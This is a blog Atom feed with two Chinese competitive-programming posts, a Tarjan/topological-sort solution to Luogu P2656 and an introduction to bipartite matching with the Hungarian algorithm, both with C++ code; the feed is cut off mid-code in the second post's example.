<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>xia0ji233&#39;s blog</title>
  
  <subtitle>学习应该像呼吸一样自然</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-02-07T09:36:52.590Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>xia0ji233</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>洛谷P2656题解</title>
    <link href="http://example.com/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/"/>
    <id>http://example.com/2022/02/07/%E6%B4%9B%E8%B0%B7P2656%E9%A2%98%E8%A7%A3/</id>
    <published>2022-02-07T03:00:00.000Z</published>
    <updated>2022-02-07T09:36:52.590Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://www.luogu.com.cn/problem/P2656">洛谷P2656</a>题解。</p><span id="more"></span><h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>小胖和 ZYR 要去 ESQMS 森林采蘑菇。</p><p>ESQMS 森林间有 N个小树丛，M 条小径，每条小径都是单向的，连接两个小树丛，上面都有一定数量的蘑菇。小胖和 ZYR 经过某条小径一次，可以采走这条路上所有的蘑菇。由于 ESQMS 森林是一片神奇的沃土，所以一条路上的蘑菇被采过后，又会长出一些新的蘑菇，数量为原来蘑菇的数量乘上这条路的“恢复系数”，再下取整。</p><p>比如，一条路上有 4个蘑菇，这条路的“恢复系数”为 0.70，则第一~四次经过这条路径所能采到的蘑菇数量分别为 4,2,1,0。</p><p>现在，小胖和 ZYR 从 S号小树丛出发，求他们最多能采到多少蘑菇。</p><hr><p>就是沿线采蘑菇，然后给定起点，没有给终点，蘑菇采完后会复活，复活的个数为上一次的个数×恢复系数。路是单向的，那么可以据此建一个有向图。如果一条边的两个顶点在同一个强连通分量内的话，那么这条边我可以经过无数次，这很容易证明。但是如果一条边的两个点不在同一个强连通分量，那么我只能采一次上面的蘑菇。因为题目没有规定不能反复横跳，所以我们可以先tarjan缩点然后把内部的边权集中到点上，再集中的时候只需要注意一定是要×系数累加上去的，因为我能无数次经过。</p><p>缩点之后就是对DAG处理，我看大佬们用的都是最短路径算法，这里菜鸡只会拓扑排序qwq。</p><p>这里还需要注意的是，起点所在的强连通分量如果入读不为0那么那些蘑菇我是采不到的。因此我在这里设立一个flag标记，在拓扑排序的时候如果flag为0那么我只把点和边删了，不做数值上的处理。然后我对起点所在的强连通分量flag设1，然后如果flag为1则会向后面的点传递。</p><p>在写状态转移方程的时候注意要把路上的蘑菇和那个点的蘑菇都加上。</p><p>如果路径上的蘑菇为w，v强连通分量上的蘑菇数为$amount[v]$。那么$u-&gt;v$的状态转移方程就应该是</p><p>$ans[v]=max(ans[v],ans[u]+w+amount[v])$</p><p>最后注意一个，那就是一定要记着不管怎样给最终结果赋一个初始值就是起点所在强连通分量的蘑菇数量，这里卡了一下。</p><p>下面给出AC代码。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 80005</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line"><span class="keyword">int</span> w;</span><br><span class="line"><span class="keyword">float</span> p;</span><br><span class="line">&#125;edge[maxn*<span class="number">3</span>],e[maxn*<span class="number">3</span>];</span><br><span class="line"><span class="keyword">int</span> root[maxn],root2[maxn],dfn[maxn],low[maxn],visited[maxn],s[maxn],degree[maxn],num[maxn],amount[maxn],ans[maxn],flag[maxn],cnt,cnt2,tot,top,deep,n,m;</span><br><span class="line">stack&lt;<span class="keyword">int</span>&gt;ss;<span class="comment">//拓扑排序用的栈</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//一开始的建图</span></span><br><span class="line">edge[++cnt].to=y;</span><br><span class="line">edge[cnt].w=w;</span><br><span class="line">edge[cnt].next=root[x];</span><br><span class="line">edge[cnt].p=p;</span><br><span class="line">root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add2</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y,<span class="keyword">int</span> w,<span class="keyword">float</span> p)</span></span>&#123;<span class="comment">//强连通分量的建图</span></span><br><span class="line">degree[y]++;</span><br><span class="line">e[++cnt2].next=root2[x];</span><br><span class="line">e[cnt2].to=y;</span><br><span class="line">e[cnt2].w=w;</span><br><span class="line">e[cnt2].p=p;</span><br><span class="line">root2[x]=cnt2;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">tarjan</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;<span class="comment">//tarjan板子</span></span><br><span class="line">visited[u]=<span class="number">1</span>;</span><br><span class="line">dfn[u]=low[u]=++deep;</span><br><span class="line">s[++top]=u;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(!dfn[v])&#123;</span><br><span class="line"><span class="built_in">tarjan</span>(v);</span><br><span class="line">low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(visited[v])&#123;</span><br><span class="line">low[u]=<span class="built_in">min</span>(low[u],low[v]);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(dfn[u]==low[u])&#123;</span><br><span class="line">visited[u]=<span class="number">0</span>;</span><br><span class="line">num[u]=++tot;</span><br><span class="line"><span class="keyword">while</span>(s[top]!=u)&#123;</span><br><span class="line">visited[s[top]]=<span class="number">0</span>;</span><br><span class="line">num[s[top--]]=tot;</span><br><span class="line">&#125;</span><br><span class="line">top--;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//freopen(&quot;1.txt&quot;,&quot;r&quot;,stdin);</span></span><br><span class="line">    cin&gt;&gt;n&gt;&gt;m;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=m;i++)&#123;</span><br><span class="line"><span class="keyword">int</span> x, y, w;</span><br><span class="line"><span class="keyword">float</span> p;</span><br><span class="line">cin&gt;&gt;x&gt;&gt;y&gt;&gt;w&gt;&gt;p;</span><br><span class="line"><span class="built_in">add</span>(x,y,w,p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> start;</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;start);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!dfn[i])<span class="built_in">tarjan</span>(i);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=root[i];j;j=edge[j].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=edge[j].to,w=edge[j].w;</span><br><span class="line">            <span class="keyword">float</span> p=edge[j].p;</span><br><span class="line"><span class="keyword">if</span>(num[i]==num[v])&#123;<span class="comment">//同一个强连通分量内则把所有能产生的蘑菇加上</span></span><br><span class="line"><span class="keyword">while</span>(w!=<span class="number">0</span>)&#123;</span><br><span class="line">amount[num[i]]+=w;</span><br><span class="line">w=(<span class="keyword">int</span>)((p)*w);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">add2</span>(num[i],num[v],w,p);<span class="comment">//否则建边</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=tot;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(!degree[i])ss.<span class="built_in">push</span>(i);</span><br><span class="line">&#125;</span><br><span class="line">ans[num[start]]=amount[num[start]];</span><br><span class="line">flag[num[start]]=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> res=ans[num[start]];<span class="comment">//res一定赋初值不要忘了</span></span><br><span class="line"><span class="keyword">while</span>(!ss.<span class="built_in">empty</span>())&#123;</span><br><span class="line"><span class="keyword">int</span> x=ss.<span class="built_in">top</span>();</span><br><span class="line">ss.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root2[x];i;i=e[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=e[i].to,w=e[i].w;</span><br><span class="line">degree[v]--;</span><br><span class="line"><span class="keyword">if</span>(!degree[v])ss.<span class="built_in">push</span>(v);</span><br><span class="line"><span class="keyword">if</span>(flag[x])&#123;</span><br><span class="line">ans[v]=<span class="built_in">max</span>(ans[v],ans[x]+w+amount[v]);<span class="comment">//状态转移方程</span></span><br><span class="line">res=<span class="built_in">max</span>(res,ans[v]);<span class="comment">//保存结果</span></span><br><span class="line">flag[v]=<span class="number">1</span>;<span class="comment">//flag向前传播</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(tot==<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,ans[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,res);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://www.luogu.com.cn/problem/P2656&quot;&gt;洛谷P2656&lt;/a&gt;题解。&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="图论" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/"/>
    
    <category term="强连通分量、缩点" scheme="http://example.com/categories/icpc/%E5%9B%BE%E8%AE%BA/%E5%BC%BA%E8%BF%9E%E9%80%9A%E5%88%86%E9%87%8F%E3%80%81%E7%BC%A9%E7%82%B9/"/>
    
    
  </entry>
  
  <entry>
    <title>二分图入门</title>
    <link href="http://example.com/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/</id>
    <published>2022-02-04T03:00:00.000Z</published>
    <updated>2022-02-04T15:36:00.001Z</updated>
    
    <content type="html"><![CDATA[<p>然后今天来学二分图，首先我们来看看二分图的定义。</p><span id="more"></span><h2 id="二分图的定义"><a href="#二分图的定义" class="headerlink" title="二分图的定义"></a>二分图的定义</h2><p>首先二分图它是一个图(G)，由点集(V)和边集(E)构成的集合，即<code>G=(V,E)</code>。</p><p>除此之外它还满足一个特点，若这个图的点集存在一个<strong>划分</strong><code>&#123;V1,V2&#125;</code>使得，任意的<code>e(i,j,w)∈E</code>满足关系，<code>i∈V1,j∈V2</code>或者是<code>i∈V2,j∈V1</code>。那么这个图就被称为一个二分图。</p><p>以上是比较数学的说法，而且是自己DIY的(狗头。那说人话就是说，如果你能找到一个合理的方式把点划成两个部分，使得每条边的两个顶点均不同时属于一个部分。那么它就是一个二分图。反之，如果不存在这样的划分满足以上结果，那么它就不是一个二分图。</p><p>二分图的一个等价定义是：不含有<strong>含奇数条边的环</strong>的图。</p><p>如果说了这么多让你感觉到还是有一点点难以理解的话，那么我们换一个思路：假设把人比作点，把相爱关系比作边。假设这个人群内没有舔狗(恋情非单向)和男酮，那么它们的关系组成的图就会是一个二分图。时间管理大师(一人同时与多人)不影响它还是一个二分图的，只要没有同就行。不知道这个例子是否够抽象，更易于理解。</p><p>举个例子，如下图，它是不是一个二分图？</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/1.png" alt="1"></p><p>判断二分图可以用它的性质，显而易见的性质是什么：边连接的两个点一定属于不同集合。用刚刚那个例子再去讲的话就是：没有同的情况下，喜欢男孩的一定都是女孩，而这里我们划分就是以男孩女孩作为依据划分的，接着往下推又可以得到：喜欢<strong>喜欢男孩的人</strong>的人一定也是男孩。这里我们从1开始，假设1为男，那么5，7必为女，2，8，3必为男，6，4必为女。</p><p>我们就可以得到划分：<code>&#123;&#123;1,2,3,8&#125;,&#123;4,5,6,7&#125;&#125;</code>。那么我们稍微画的明显一点，将两个划分独立为两排，得到了以下图。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/2.png" alt="2"></p><p>为了方便，我们一般都会把二分图化成这种形式，可以很清楚的发现，同一排之间的点没有连线。那么你现在一定对二分图有了一个较为清楚的认识，那么可能会疑惑，这样的数据结构能用来处理什么样的问题呢？那么就涉及到我们接下来讲的概念了。</p><h2 id="一些概念"><a href="#一些概念" class="headerlink" title="一些概念"></a>一些概念</h2><ol><li>匹配(matching)：匹配其实就是一个边的集合，任意两条属于匹配的边都没有公共顶点，那么这个集合就叫做这个图的一个匹配。</li><li>匹配点：如果这个点存在于这个匹配的任意一条边上，那么这个点就是一个匹配点。</li><li>匹配边：如果这个边属于这个匹配，那么这就是一个匹配边。</li><li>非匹配点：与匹配点相对</li><li>非匹配边：与匹配边相对</li><li>最大匹配：在所有匹配中，所含边数量最多的称为最大匹配。</li><li>完美匹配：如果一个匹配中的所有边包含了一个图的所有点，即，一个图当中所有的点都为匹配点时，这个匹配称为完美匹配，并非所有的图都含有完美匹配，完美匹配一定是最大匹配。</li></ol><h3 id="实际应用"><a href="#实际应用" class="headerlink" title="实际应用"></a>实际应用</h3><p>比如还是上面这个图，假设它们就是四男四女，我们要怎样做，才能尽可能保证它们都和自己喜欢的人凑成一对呢？这实际上就是要求二分图的最大匹配了，最大匹配我们一般是用匈牙利算法，对于匈牙利算法，我们需要再补充一点概念。</p><ol><li>交替路：如果从一个非匹配点出发，依次经过匹配边，非匹配边，匹配边，非匹配边……形成的路径就叫交替路。</li><li>增广路：如果交替路的终点为一个非匹配点，那么这条交替路我们又叫增广路。</li></ol><p>如下图</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/3.png" alt="3"></p><p>红色点和红色边为匹配点和匹配边，这是一条增广路。</p><p>增广路的性质就是非匹配边会比匹配边多一条。如果我们把匹配边和非匹配边交换顺序，那么将会得到</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/4.png" alt="4"></p><p>可以到相比之前多了一个匹配边和两个匹配点。但是匹配顺序完全不一样了，原来是2，3匹配，4，5匹配，现在2，3和4，5都不在同一条匹配边上。</p><p>匈牙利算法的本质就是不停寻找增广路，增加匹配数目的。我们先不考虑匈牙利算法的代码，先徒手做一遍。首先我们需要匹配的点只有一边，另一边是被匹配的。</p><p>如最开始那个图，</p><p>从1开始，遍历边，先看1，5，发现5未被匹配，则直接匹配，结束。</p><p>那么现在的图是这样的。</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/5.png" alt="5"></p><p>从2开始，2未被匹配，则寻找与它相连的边，找到(2,5)，但是发现5已经被匹配了，这个时候就要用到寻找增广路的思维了。那么我们直接沿着匹配边搜寻，就找到了1，然后从1开始找相连的边，因为不能反复横跳，所以我们只能选择7，发现7没被匹配，因此2-5-1-7构成增广路，找到增广路之后代表首位两个点参与进了匹配。然后交换匹配边与非匹配边。成了这样</p><p><img src="/2022/02/04/%E4%BA%8C%E5%88%86%E5%9B%BE%E5%85%A5%E9%97%A8/6.png" alt="6"></p><p>这里我们不考虑最好的情况，因为我们自己很清楚3，6匹配，4，8匹配直接就完结撒花了。但是计算机不一定按照这样的方式去遍历，你要保证先后顺序不影响最终结果，即就算你选择5，最终算出来的最大匹配应当也是4。</p><p>这里我们选5，发现5被匹配了，于是找到2，但是2之后再也找不到路径了，因此(3,5)方向上的增广路寻找失败，所以就会找(3,6)，(3,6)直接匹配，我们看看最后这个8会怎么样呢，我们假设也是先找到了7，7会找到1，1会找到5，5找到2，发现2找不到增广路了，返回失败。所以最终选择了(8,4)。那么这样一整个就是匈牙利算法了。</p><p>这里用C代码大概写一下，假设存图采用链式前向星。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[MAX_EDGE];</span><br><span class="line"><span class="keyword">int</span> match[MAX_NODE],check[MAX_NODE],root[MAX_NODE];</span><br><span class="line">vector&lt;<span class="keyword">int</span>&gt;s;<span class="comment">//存储一边的点集</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line">edge[++cnt].to=y;</span><br><span class="line">edge[cnt].next=root[x];</span><br><span class="line">root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">check[v]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">match[u]=v;</span><br><span class="line">match[v]=u;</span><br><span class="line">check[v]=<span class="literal">false</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.<span class="built_in">size</span>();i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(match[s[i]]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[s[i]]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">dfs</span>(s[i]))ans++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h3><p><a href="https://www.luogu.com.cn/problem/P1129">洛谷P1129</a></p><p>小 Q 是一个非常聪明的孩子，除了国际象棋，他还很喜欢玩一个电脑益智游戏――矩阵游戏。矩阵游戏在一个 n \times n<em>n</em>×<em>n</em> 黑白方阵进行（如同国际象棋一般，只是颜色是随意的）。每次可以对该矩阵进行两种操作：</p><ul><li>行交换操作：选择矩阵的任意两行，交换这两行（即交换对应格子的颜色）。</li><li>列交换操作：选择矩阵的任意两列，交换这两列（即交换对应格子的颜色）。</li></ul><p>游戏的目标，即通过若干次操作，使得方阵的主对角线(左上角到右下角的连线)上的格子均为黑色。</p><p>对于某些关卡，小 Q 百思不得其解，以致他开始怀疑这些关卡是不是根本就是无解的！于是小 Q 决定写一个程序来判断这些关卡是否有解。</p><p>题意简单明了就是给一个01矩阵，问你能不能通过行交换与列交换将主对角线的元素都变成1。</p><p>那么其实就是每一行找到一个1，使得每个1处于不同的列。只要找到，那么经过若干次交换一定能使主对角线元素都为1。如果第一行的第三列存在一个1，那么就让1和3相连。当然因为这里的3不能和第三行混淆，所以我们选择列数+n作为二分图的另一个点集。所以我们只需要让行列都匹配那就完成了。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">eee</span>&#123;</span></span><br><span class="line"><span class="keyword">int</span> to;</span><br><span class="line"><span class="keyword">int</span> next;</span><br><span class="line">&#125;edge[<span class="number">100000</span>];</span><br><span class="line"><span class="keyword">int</span> cnt,n,root[<span class="number">501</span>],check[<span class="number">500</span>],match[<span class="number">500</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> x,<span class="keyword">int</span> y)</span></span>&#123;</span><br><span class="line"><span class="comment">//printf(&quot;%d %d\n&quot;,x,y);</span></span><br><span class="line">edge[++cnt].to=y;</span><br><span class="line">edge[cnt].next=root[x];</span><br><span class="line">root[x]=cnt;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u)</span></span>&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=root[u];i;i=edge[i].next)&#123;</span><br><span class="line"><span class="keyword">int</span> v=edge[i].to;</span><br><span class="line"><span class="keyword">if</span>(!check[v])&#123;</span><br><span class="line">check[v]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(match[v]==<span class="number">-1</span>||<span class="built_in">dfs</span>(match[v]))&#123;</span><br><span class="line">match[u]=v;</span><br><span class="line">match[v]=u;</span><br><span class="line">check[v]=<span class="literal">false</span>; </span><br><span class="line"><span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">xyl</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(match[i]==<span class="number">-1</span>)&#123;</span><br><span class="line">            check[i]=<span class="literal">true</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">dfs</span>(i))ans++;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">cin&gt;&gt;n;</span><br><span class="line"><span class="built_in">memset</span>(root,<span class="number">0</span>,<span class="built_in"><span class="keyword">sizeof</span></span>(root));</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=<span class="number">2</span>*n;i++)match[i]=<span class="number">-1</span>;</span><br><span class="line">cnt=<span class="number">0</span>;</span><br><span class="line">string s;</span><br><span class="line"><span class="built_in">getchar</span>();</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span 